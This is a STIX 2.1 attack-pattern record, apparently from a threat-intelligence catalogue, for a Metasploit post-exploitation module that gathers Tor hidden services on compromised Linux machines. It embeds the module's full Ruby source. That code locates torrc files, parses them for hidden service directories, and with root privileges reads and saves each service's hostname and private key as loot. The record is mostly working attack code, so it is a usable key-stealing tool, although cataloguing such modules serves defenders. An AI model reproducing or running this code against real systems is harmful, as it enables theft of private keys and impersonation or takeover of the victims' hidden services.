{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce25bfb0-97d1-4838-b4de-d19ae491794e",
    "created": "2024-08-14T16:33:15.122768Z",
    "modified": "2024-08-14T16:33:15.122772Z",
    "name": "Linux Gather TOR Hidden Services",
    "description": " This module collects the hostnames name and private keys of any TOR Hidden Services running on the target machine. It will search for torrc and if found, will parse it for the directories of Hidden Services. However, root permissions are required to read them as they are owned by the user that TOR runs as, usually a separate account.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/tor_hiddenservices.rb",
            "external_id": "tor_hiddenservices.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n# Adapted from post/linux/gather/enum_configs.rb\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather TOR Hidden Services',\n        'Description' => %q{\n          This module collects the hostnames name and private keys of\n          any TOR Hidden Services running on the target machine. It\n          will search for torrc and if found, will parse it for the\n          directories of Hidden Services. However, root permissions\n          are required to read them as they are owned by the user that\n          TOR runs as, usually a separate account.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Harvey Phillips <xcellerator[at]gmx.com>',\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  def run\n    print_status(\"Running module against #{get_hostname} (#{session.session_host})\")\n\n    distro = get_sysinfo\n    print_status('Info:')\n    print_status(\"\\t#{distro[:version]}\")\n    print_status(\"\\t#{distro[:kernel]}\")\n    print_status('Looking for torrc...')\n    find_torrc\n  end\n\n  def save(file, data, ltype, ctype = 'text/plain')\n    fname = ::File.basename(file)\n    loot = store_loot(ltype, ctype, session, data, fname)\n    print_status(\"#{fname} stored in #{loot}\")\n  end\n\n  def find_torrc\n    fail_with(Failure::BadConfig, \"'locate' command does not exist\") unless command_exists?('locate')\n\n    config = cmd_exec(\"locate 'torrc' | grep -v 'torrc.5.gz'\").split(\"\\n\")\n    if config.empty?\n      print_error('No torrc file found, maybe it goes by a different name?')\n    else\n      hidden = Array.new\n      # For every torrc file found, parse them for HiddenServiceDir\n      config.each do |c|\n        print_good(\"Torrc file found at #{c}\")\n        services = cmd_exec(\"cat #{c} | grep HiddenServiceDir | grep -v '#' | cut -d ' ' -f 2\").split(\"\\n\")\n        # For each HiddenServiceDir found in the torrc(s), push them to the hidden array\n        services.each do |s|\n          hidden.push(s)\n        end\n      end\n      # Remove any duplicate entries\n      hidden = hidden.uniq\n      # If hidden is empty, then no Hidden Services are running.\n      if !hidden.empty?\n        print_good(\"#{hidden.length} hidden services have been found!\")\n      else\n        print_bad('No hidden services were found!')\n      end\n\n      if is_root?\n        # For all the Hidden Services found, loot hostname file\n        hidden.each do |f|\n          output = read_file(\"#{f}hostname\")\n          save(f, output, \"tor.#{f.split('/')[-1]}.hostname\") if output && output !~ /No such file or directory/\n        end\n\n        # For all the Hidden Services found, loot private_key file\n        hidden.each do |f|\n          output = read_file(\"#{f}private_key\")\n          save(f, output, \"tor.#{f.split('/')[-1]}.privatekey\") if output && output !~ /No such file or directory/\n        end\n      else\n        print_error('Hidden Services were found, but we need root to access the directories')\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}